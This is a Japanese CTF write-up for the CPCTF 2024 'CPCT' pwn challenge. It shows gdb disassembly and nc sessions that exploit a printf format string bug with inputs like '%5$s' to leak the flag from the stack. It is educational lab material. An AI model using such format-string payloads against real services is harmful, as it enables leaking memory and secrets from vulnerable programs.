# CPCT
ヒントを2つ開けた
```
flagをすべて得るには、lengthの値がflagの長さ以上となる必要があります。
lengthに値を代入している場所を見てみましょう。そこに脆弱性があります。
```

```
ズバリ、脆弱性があるのは32行目のprintf関数です。
printf関数の脆弱性を調べてみると、Format String Bug というものが見つかるはずです。
この関数でよく使われる、ある記法が重要です。
```
https://qiita.com/hachan0179/items/ff6053039353dbf53d8f#:~:text=Format%20String%20Bug%E3%81%AF%E3%80%81printf,%E3%81%A8%E3%80%81%E8%B5%B7%E3%81%93%E3%82%8B%E8%84%86%E5%BC%B1%E6%80%A7%E3%81%A7%E3%81%99%E3%80%82

gdbでみてみるとstackの5番目にflagがありそうな感じがして、`%5$s`やってみたらドンピシャだった！

```bash
┌──(kali㉿kali)-[~/…/cpctf2024/pwn/CPCT/files]
└─$ nc cpct.web.cpctf.space 30006
Please enter some string! (max 4 character)
%p%p
Thank you!
Your input:0x7ffcc176e690(nil)
Length: 19
This is your reward!
CPCTF{1m_50rrY_bu7_
                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/…/cpctf2024/pwn/CPCT/files]
└─$ gdb ./chall  
GNU gdb (Debian 13.2-1) 13.2
Copyright (C) 2023 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./chall...
(No debugging symbols found in ./chall)
gdb-peda$ starti
Starting program: /home/kali/ctf/cpctf2024/pwn/CPCT/files/chall 

Program stopped.
Warning: 'set logging off', an alias for the command 'set logging enabled', is deprecated.
Use 'set logging enabled off'.

Warning: 'set logging on', an alias for the command 'set logging enabled', is deprecated.
Use 'set logging enabled on'.


[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x0 
RDX: 0x0 
RSI: 0x0 
RDI: 0x0 
RBP: 0x0 
RSP: 0x7fffffffdd90 --> 0x1 
RIP: 0x7ffff7fe5360 (<_start>:	mov    rdi,rsp)
R8 : 0x0 
R9 : 0x0 
R10: 0x0 
R11: 0x0 
R12: 0x0 
R13: 0x0 
R14: 0x0 
R15: 0x0
EFLAGS: 0x200 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7ffff7fe534c <_dl_help+668>:	jmp    0x7ffff7fe50e0 <_dl_help+48>
   0x7ffff7fe5351:	cs nop WORD PTR [rax+rax*1+0x0]
   0x7ffff7fe535b:	nop    DWORD PTR [rax+rax*1+0x0]
=> 0x7ffff7fe5360 <_start>:	mov    rdi,rsp
   0x7ffff7fe5363 <_start+3>:	call   0x7ffff7fe5f40 <_dl_start>
   0x7ffff7fe5368 <_dl_start_user>:	mov    r12,rax
   0x7ffff7fe536b <_dl_start_user+3>:	mov    rdx,QWORD PTR [rsp]
   0x7ffff7fe536f <_dl_start_user+7>:	mov    rsi,rdx
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdd90 --> 0x1 
0008| 0x7fffffffdd98 --> 0x7fffffffe13e ("/home/kali/ctf/cpctf2024/pwn/CPCT/files/chall")
0016| 0x7fffffffdda0 --> 0x0 
0024| 0x7fffffffdda8 --> 0x7fffffffe16c ("TERMINATOR_DBUS_NAME=net.tenshu.Terminator21a9d5db22c73a993ff0b42f64b396873")
0032| 0x7fffffffddb0 --> 0x7fffffffe1b8 ("SSH_AUTH_SOCK=/tmp/ssh-ds88o6QFvy3t/agent.1044")
0040| 0x7fffffffddb8 --> 0x7fffffffe1e7 ("SESSION_MANAGER=local/kali:@/tmp/.ICE-unix/1044,unix/kali:/tmp/.ICE-unix/1044")
0048| 0x7fffffffddc0 --> 0x7fffffffe235 ("SSH_AGENT_PID=1166")
0056| 0x7fffffffddc8 --> 0x7fffffffe248 ("LANG=en_US.UTF-8")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x00007ffff7fe5360 in _start () from /lib64/ld-linux-x86-64.so.2
gdb-peda$ disassemble main
Dump of assembler code for function main:
   0x00005555555552f8 <+0>:	endbr64
   0x00005555555552fc <+4>:	push   rbp
   0x00005555555552fd <+5>:	mov    rbp,rsp
   0x0000555555555300 <+8>:	push   rbx
   0x0000555555555301 <+9>:	sub    rsp,0x98
   0x0000555555555308 <+16>:	mov    rax,QWORD PTR fs:0x28
   0x0000555555555311 <+25>:	mov    QWORD PTR [rbp-0x18],rax
   0x0000555555555315 <+29>:	xor    eax,eax
   0x0000555555555317 <+31>:	mov    eax,0x0
   0x000055555555531c <+36>:	call   0x555555555289 <init>
   0x0000555555555321 <+41>:	mov    DWORD PTR [rbp-0x85],0x0
   0x000055555555532b <+51>:	mov    BYTE PTR [rbp-0x81],0x0
   0x0000555555555332 <+58>:	mov    DWORD PTR [rbp-0x94],0x0
   0x000055555555533c <+68>:	mov    QWORD PTR [rbp-0x80],0x0
   0x0000555555555344 <+76>:	mov    QWORD PTR [rbp-0x78],0x0
   0x000055555555534c <+84>:	mov    QWORD PTR [rbp-0x70],0x0
   0x0000555555555354 <+92>:	mov    QWORD PTR [rbp-0x68],0x0
   0x000055555555535c <+100>:	mov    QWORD PTR [rbp-0x60],0x0
   0x0000555555555364 <+108>:	mov    QWORD PTR [rbp-0x58],0x0
   0x000055555555536c <+116>:	mov    QWORD PTR [rbp-0x50],0x0
   0x0000555555555374 <+124>:	mov    QWORD PTR [rbp-0x48],0x0
   0x000055555555537c <+132>:	mov    QWORD PTR [rbp-0x40],0x0
   0x0000555555555384 <+140>:	mov    QWORD PTR [rbp-0x38],0x0
   0x000055555555538c <+148>:	mov    QWORD PTR [rbp-0x30],0x0
   0x0000555555555394 <+156>:	mov    QWORD PTR [rbp-0x28],0x0
   0x000055555555539c <+164>:	mov    DWORD PTR [rbp-0x20],0x0
   0x00005555555553a3 <+171>:	lea    rax,[rip+0xc5e]        # 0x555555556008
   0x00005555555553aa <+178>:	mov    rsi,rax
   0x00005555555553ad <+181>:	lea    rax,[rip+0xc56]        # 0x55555555600a
   0x00005555555553b4 <+188>:	mov    rdi,rax
   0x00005555555553b7 <+191>:	call   0x555555555190 <fopen@plt>
   0x00005555555553bc <+196>:	mov    QWORD PTR [rbp-0x90],rax
   0x00005555555553c3 <+203>:	cmp    QWORD PTR [rbp-0x90],0x0
   0x00005555555553cb <+211>:	jne    0x5555555553e6 <main+238>
   0x00005555555553cd <+213>:	lea    rax,[rip+0xc3f]        # 0x555555556013
   0x00005555555553d4 <+220>:	mov    rdi,rax
   0x00005555555553d7 <+223>:	call   0x555555555100 <puts@plt>
   0x00005555555553dc <+228>:	mov    eax,0x1
   0x00005555555553e1 <+233>:	jmp    0x555555555545 <main+589>
   0x00005555555553e6 <+238>:	mov    rdx,QWORD PTR [rbp-0x90]
   0x00005555555553ed <+245>:	lea    rax,[rbp-0x80]
   0x00005555555553f1 <+249>:	mov    esi,0x64
   0x00005555555553f6 <+254>:	mov    rdi,rax
   0x00005555555553f9 <+257>:	call   0x555555555170 <fgets@plt>
   0x00005555555553fe <+262>:	mov    rax,QWORD PTR [rbp-0x90]
   0x0000555555555405 <+269>:	mov    rdi,rax
   0x0000555555555408 <+272>:	call   0x555555555110 <fclose@plt>
   0x000055555555540d <+277>:	lea    rax,[rip+0xc1c]        # 0x555555556030
   0x0000555555555414 <+284>:	mov    rdi,rax
   0x0000555555555417 <+287>:	call   0x555555555100 <puts@plt>
   0x000055555555541c <+292>:	lea    rax,[rbp-0x85]
   0x0000555555555423 <+299>:	mov    edx,0x5
   0x0000555555555428 <+304>:	mov    rsi,rax
   0x000055555555542b <+307>:	mov    edi,0x0
   0x0000555555555430 <+312>:	call   0x555555555160 <read@plt>
   0x0000555555555435 <+317>:	mov    DWORD PTR [rbp-0x9c],0x0
   0x000055555555543f <+327>:	jmp    0x55555555546e <main+374>
   0x0000555555555441 <+329>:	mov    eax,DWORD PTR [rbp-0x9c]
   0x0000555555555447 <+335>:	cdqe
   0x0000555555555449 <+337>:	movzx  eax,BYTE PTR [rbp+rax*1-0x85]
   0x0000555555555451 <+345>:	cmp    al,0xa
   0x0000555555555453 <+347>:	jne    0x555555555467 <main+367>
   0x0000555555555455 <+349>:	mov    eax,DWORD PTR [rbp-0x9c]
   0x000055555555545b <+355>:	cdqe
   0x000055555555545d <+357>:	mov    BYTE PTR [rbp+rax*1-0x85],0x0
   0x0000555555555465 <+365>:	jmp    0x555555555477 <main+383>
   0x0000555555555467 <+367>:	add    DWORD PTR [rbp-0x9c],0x1
   0x000055555555546e <+374>:	cmp    DWORD PTR [rbp-0x9c],0x3
   0x0000555555555475 <+381>:	jle    0x555555555441 <main+329>
   0x0000555555555477 <+383>:	mov    BYTE PTR [rbp-0x81],0x0
   0x000055555555547e <+390>:	lea    rax,[rip+0xbd7]        # 0x55555555605c
   0x0000555555555485 <+397>:	mov    rdi,rax
   0x0000555555555488 <+400>:	mov    eax,0x0
   0x000055555555548d <+405>:	call   0x555555555140 <printf@plt>
   0x0000555555555492 <+410>:	lea    rax,[rbp-0x85]
   0x0000555555555499 <+417>:	mov    rdi,rax
   0x000055555555549c <+420>:	mov    eax,0x0
   0x00005555555554a1 <+425>:	call   0x555555555140 <printf@plt>
   0x00005555555554a6 <+430>:	mov    DWORD PTR [rbp-0x94],eax
   0x00005555555554ac <+436>:	mov    edi,0xa
   0x00005555555554b1 <+441>:	call   0x5555555550f0 <putchar@plt>
   0x00005555555554b6 <+446>:	mov    eax,DWORD PTR [rbp-0x94]
   0x00005555555554bc <+452>:	mov    esi,eax
   0x00005555555554be <+454>:	lea    rax,[rip+0xbae]        # 0x555555556073
   0x00005555555554c5 <+461>:	mov    rdi,rax
   0x00005555555554c8 <+464>:	mov    eax,0x0
   0x00005555555554cd <+469>:	call   0x555555555140 <printf@plt>
   0x00005555555554d2 <+474>:	lea    rax,[rip+0xba6]        # 0x55555555607f
   0x00005555555554d9 <+481>:	mov    rdi,rax
   0x00005555555554dc <+484>:	call   0x555555555100 <puts@plt>
   0x00005555555554e1 <+489>:	mov    DWORD PTR [rbp-0x98],0x0
   0x00005555555554eb <+499>:	jmp    0x555555555525 <main+557>
   0x00005555555554ed <+501>:	mov    eax,DWORD PTR [rbp-0x98]
   0x00005555555554f3 <+507>:	cdqe
   0x00005555555554f5 <+509>:	movzx  eax,BYTE PTR [rbp+rax*1-0x80]
   0x00005555555554fa <+514>:	movsx  eax,al
   0x00005555555554fd <+517>:	mov    edi,eax
   0x00005555555554ff <+519>:	call   0x5555555550f0 <putchar@plt>
   0x0000555555555504 <+524>:	mov    eax,DWORD PTR [rbp-0x98]
   0x000055555555550a <+530>:	movsxd rbx,eax
   0x000055555555550d <+533>:	lea    rax,[rbp-0x80]
   0x0000555555555511 <+537>:	mov    rdi,rax
   0x0000555555555514 <+540>:	call   0x555555555120 <strlen@plt>
   0x0000555555555519 <+545>:	cmp    rbx,rax
   0x000055555555551c <+548>:	jae    0x555555555535 <main+573>
   0x000055555555551e <+550>:	add    DWORD PTR [rbp-0x98],0x1
   0x0000555555555525 <+557>:	mov    eax,DWORD PTR [rbp-0x98]
   0x000055555555552b <+563>:	cmp    eax,DWORD PTR [rbp-0x94]
   0x0000555555555531 <+569>:	jl     0x5555555554ed <main+501>
   0x0000555555555533 <+571>:	jmp    0x555555555536 <main+574>
   0x0000555555555535 <+573>:	nop
   0x0000555555555536 <+574>:	mov    edi,0xa
   0x000055555555553b <+579>:	call   0x5555555550f0 <putchar@plt>
   0x0000555555555540 <+584>:	mov    eax,0x0
   0x0000555555555545 <+589>:	mov    rdx,QWORD PTR [rbp-0x18]
   0x0000555555555549 <+593>:	sub    rdx,QWORD PTR fs:0x28
   0x0000555555555552 <+602>:	je     0x555555555559 <main+609>
   0x0000555555555554 <+604>:	call   0x555555555130 <__stack_chk_fail@plt>
   0x0000555555555559 <+609>:	mov    rbx,QWORD PTR [rbp-0x8]
   0x000055555555555d <+613>:	leave
   0x000055555555555e <+614>:	ret
End of assembler dump.
gdb-peda$ break *0x0000555555555559
Breakpoint 1 at 0x555555555559
gdb-peda$ c
Continuing.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Please enter some string! (max 4 character)
%p%p
Thank you!
Your input:0x7fffffffda30(nil)
Length: 19
This is your reward!
flag{flag}


[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0xb ('\x0b')
RCX: 0x7ffff7ebeb00 (<__GI___libc_write+16>:	cmp    rax,0xfffffffffffff000)
RDX: 0x0 
RSI: 0x7ffff7f9b803 --> 0xf9ca30000000000a 
RDI: 0x7ffff7f9ca30 --> 0x0 
RBP: 0x7fffffffdc80 --> 0x1 
RSP: 0x7fffffffdbe0 --> 0x430326674 
RIP: 0x555555555559 (<main+609>:	mov    rbx,QWORD PTR [rbp-0x8])
R8 : 0xee08 
R9 : 0x0 
R10: 0x0 
R11: 0x202 
R12: 0x0 
R13: 0x7fffffffdda8 --> 0x7fffffffe16c ("TERMINATOR_DBUS_NAME=net.tenshu.Terminator21a9d5db22c73a993ff0b42f64b396873")
R14: 0x555555557d70 --> 0x555555555240 (<__do_global_dtors_aux>:	endbr64)
R15: 0x7ffff7ffd000 --> 0x7ffff7ffe2d0 --> 0x555555554000 --> 0x10102464c457f
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x555555555549 <main+593>:	sub    rdx,QWORD PTR fs:0x28
   0x555555555552 <main+602>:	je     0x555555555559 <main+609>
   0x555555555554 <main+604>:	call   0x555555555130 <__stack_chk_fail@plt>
=> 0x555555555559 <main+609>:	mov    rbx,QWORD PTR [rbp-0x8]
   0x55555555555d <main+613>:	leave
   0x55555555555e <main+614>:	ret
   0x55555555555f:	add    bl,dh
   0x555555555561 <_fini+1>:	nop    edx
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdbe0 --> 0x430326674 
0008| 0x7fffffffdbe8 --> 0x130000000b 
0016| 0x7fffffffdbf0 --> 0x5555555592a0 --> 0x555555559 
0024| 0x7fffffffdbf8 --> 0x70257025000000 ('')
0032| 0x7fffffffdc00 ("flag{flag}\n")
0040| 0x7fffffffdc08 --> 0xa7d67 ('g}\n')
0048| 0x7fffffffdc10 --> 0x0 
0056| 0x7fffffffdc18 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0000555555555559 in main ()
gdb-peda$ c
Continuing.

Program received signal SIGALRM, Alarm clock.
[Inferior 1 (process 62891) exited normally]
Warning: not running
gdb-peda$ q
                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/…/cpctf2024/pwn/CPCT/files]
└─$ nc cpct.web.cpctf.space 30006
Please enter some string! (max 4 character)
%5$x
Thank you!
Your input:170b7480
Length: 8
This is your reward!
CPCTF{1m
                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/…/cpctf2024/pwn/CPCT/files]
└─$ nc cpct.web.cpctf.space 30006
Please enter some string! (max 4 character)
%5$s
Thank you!
Your input:CPCTF{1m_50rrY_bu7_i_Hav3_0nLy_45_ch4raCteRs}
Length: 45
This is your reward!
CPCTF{1m_50rrY_bu7_i_Hav3_0nLy_45_ch4raCteRs}


```